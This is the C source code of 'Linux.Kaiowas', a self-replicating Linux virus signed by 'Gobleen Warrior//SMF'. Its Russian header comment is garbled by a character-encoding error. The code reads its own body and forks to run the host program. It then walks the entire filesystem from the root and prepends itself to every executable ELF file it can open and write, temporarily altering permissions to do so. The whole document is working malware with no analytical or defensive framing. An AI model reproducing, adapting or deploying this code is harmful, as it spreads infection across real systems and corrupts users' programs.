   //
   //                            <Linux.Kaiowas>
   //
   // Œ®© ¯¥à¢ë© ¢¨àãá   ‘. *®íâ®¬ã ª®¤ ¢¥áì¬  ª®àï¢ë© ¨ ¥®¯â¨¬¨§¨à®¢ ë©.
   // *¥ªãàá¨¢® ®¡å®¤¨â ¤¥à¥¢® ª â «®£®¢ ¨ ¯®à ¦ ¥â  ©¤¥ë¥ ¨á¯®«ï¥¬ë¥ ä ©«ë,
   // ä®à¬ â  ELF HLL-ë¬ á¯®á®¡®¬ - á¤¢¨£ ¥â  ç «® ®à¨£¨ «ì®£® ä ©«  ¢¨§  
   // ¤«¨ã ¢¨àãá®£® ä ©« , ¨ § ¯¨áë¢ ¥â ¢¨àãáë© ä ©« ¢ ®á¢®¡®¤¨¢è¥¥áï ¬¥áâ®.
   // *à¨ § ¯ãáª¥ ¢ë§ë¢ ¥â fork() ¤«ï â®£®, çâ®¡ë ¯®«ì§®¢ â¥«ìáª¨© ¯à®æ¥áá
   // à ¡®â « ¯ à ««¥«ì® á ¢¨àãáë¬, ¤ ¡ë ¥ § ¨¬ âì ¬®£® ¢à¥¬¥¨, ¯®á«¥ ç¥£®
   // ª®¯¨àã¥â ¤®¯¨á ë© ®à¨£¨ «ìë© ä ©« ¢ ®â¤¥«ìë© ä ©«, ¨ § ¯ãáª ¥â ¥£®  
   // ¢ë¯®«¥¨¥. ‚ íâ® ¢à¥¬ï ¢ á¨áâ¥¬¥ ®¤®¢à¥¬¥® à ¡®â îâ ¢¨àãá ¨ ®à¨£¨ «ìë©
   // ä ©«.
   //
   // 19.04.01                      (c) Gobleen Warrior//SMF

   #include <sys/types.h>
   #include <sys/stat.h>
   #include <fcntl.h>
   #include <unistd.h>
   #include <stdio.h>
   #include <string.h>

   #define virus_len 8624
   #define byte_block virus_len
   #define name_len sizeof(our_name)

   char our_name[] = "Linux.Kaiowas by Gobleen Warrior//SMF";

   int our_fd, tmp_fd;
   char buffer[byte_block], vir_buf[virus_len];

   int main(int argc, char **argv, char **envp)
   {
       char *exec_tmp;
       ssize_t bytes_cnt;
       pid_t pid;
       if ((our_fd = open(argv[0], O_RDONLY)) != -1)
       {
       if (read(our_fd, vir_buf, virus_len) == -1) exit(-1);
       exec_tmp = tempnam(NULL, argv[0]);
       if ((tmp_fd = open(exec_tmp, O_WRONLY|O_CREAT|O_TRUNC, 0400|0200|0100)) == -1)
       {
           close(our_fd);
           exit(-1);
       }
       while((bytes_cnt = read(our_fd, buffer, byte_block)) > 0)
       {
           if (write(tmp_fd, buffer, bytes_cnt) < bytes_cnt)
           {
           close(tmp_fd);
           close(our_fd);
           unlink(exec_tmp);
           exit(-1);
           }
       }
       close(tmp_fd);
       close(our_fd);
       pid = fork();
       if (pid == 0)
       {
           execve(exec_tmp, argv, envp);
           exit(-1);
       }
       else if (pid > 0)
       {
           int process_file(const char *, const struct stat *, int);
           ftw("/", process_file, 1);
       }
       exit(0);
       }
   }

   process_file(const char *vic_name, const struct stat *status, int type)
   {
       int vic_perm, vic_fd, bytes_cnt;
       vic_perm = status->st_mode;
       if((status->st_mode&S_IFREG) && (status->st_mode&(S_IXUSR|S_IXGRP|S_IXOTH)))
       {
       char *tmp_name;
       if (chmod(vic_name, S_IRUSR|S_IWUSR) == -1) return 0;
       if ((vic_fd = open(vic_name, O_RDWR)) == -1)
       {
               chmod(vic_name, vic_perm);
           return 0;
       }
       tmp_name = tempnam(NULL, "GWI");
       if ((tmp_fd = open(tmp_name, O_WRONLY|O_CREAT|O_TRUNC, 0400|0200|0100)) == -1)
       {
           close(vic_fd);
               chmod(vic_name, vic_perm);
           return 0;
       }
       if ((bytes_cnt = read(vic_fd, buffer, byte_block)) == -1)
       {
           close(vic_fd);
           close(tmp_fd);
           unlink(tmp_name);
               chmod(vic_name, vic_perm);
           return 0;
       }
       if (bytes_cnt > name_len)
       {
           char *i;
           for(i=buffer; i<(buffer+byte_block-name_len); i++)
           {
           if ((!strcmp(i, our_name)) || (strncmp(buffer+1, "ELF", 3)))
           {
               close(vic_fd);
               close(tmp_fd);
               unlink(tmp_name);
                   chmod(vic_name, vic_perm);
               return 0;
           }
           }
       }
       lseek(vic_fd, 0, SEEK_SET);
       if (write(tmp_fd, vir_buf, virus_len) < virus_len)
       {
           close(tmp_fd);
           close(vic_fd);
           unlink(tmp_name);
           chmod(vic_name, vic_perm);
           return 0;
       }
       lseek(our_fd, 0, SEEK_SET);
       while((bytes_cnt = read(vic_fd, buffer, byte_block)) > 0)
       {
           if (write(tmp_fd, buffer, bytes_cnt) < bytes_cnt)
           {
           close(tmp_fd);
           unlink(tmp_name);
           chmod(vic_name, vic_perm);
           return 0;
           }
       }
       close(vic_fd);
       close(tmp_fd);
       if (rename(tmp_name, vic_name) == -1)
       {
           close(tmp_fd);
           unlink(tmp_name);
           chmod(vic_name, vic_perm);
           return 0;
       }
       chmod(vic_name, vic_perm);
       }
       return 0;
   }
